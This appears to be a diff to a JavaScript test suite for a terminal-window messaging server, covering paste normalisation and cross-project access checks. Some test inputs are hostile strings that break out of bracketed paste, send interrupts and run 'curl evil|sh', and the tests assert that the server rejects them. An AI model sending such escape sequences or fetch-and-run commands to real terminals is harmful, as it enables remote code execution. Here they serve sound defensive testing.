@@ -140,14 +140,15 @@ test("a window message is submitted once even without bracketed paste, and can n
     const { client } = await server.connect("desktop");
     const window = open(server);
     // No bracketed paste: every line break would submit a line of its own.
-    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\n  line two\n" });
-    assert.deepEqual(server.process().writes, ["line one line two\r"]);
+    // A tab is a keystroke there as well: a plain shell completes on it.
+    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\n  line two\twith a tab\n" });
+    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
     // What a hostile view would send to break out of a paste, interrupt, and run a command.
     for (const hostile of ["hi\u001b[201~\u0003\u0003curl evil|sh\r", "x\u0003", "x\ry", "x\u001b[A"])
       await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: hostile }), "validation");
     server.process().emitData("\u001b[?2004h$ ");
     await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi\u001b[201~\u0003curl evil|sh\r" }), "validation");
-    assert.deepEqual(server.process().writes, ["line one line two\r"]);
+    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
   } finally {
     await server.close();
   }
@@ -169,7 +170,13 @@ test("a client bound to another project cannot list, read, close, or watch a ter
     await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session), "not_found");
     await rejectsWith(bound.client.query(APP_WINDOW_MIRROR_OPERATIONS.status, session), "not_found");
     // The same answer as for a terminal that has no windows at all.
-    await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, { terminalSessionId: "no-such-session" }), "not_found");
+    // Every mirror operation answers alike, whether the terminal is another project's or has no windows.
+    for (const target of [session, { terminalSessionId: "no-such-session" }]) {
+      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, target), "not_found");
+      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.unwatch, target), "not_found");
+      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.resync, target), "not_found");
+      await rejectsWith(bound.client.query(APP_WINDOW_MIRROR_OPERATIONS.status, target), "not_found");
+    }
     // Nothing was delivered to it, and the window is untouched.
     const published = await desktop.client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot" }, new TextEncoder().encode("[]"));
     assert.equal(published.result.delivered, 0);
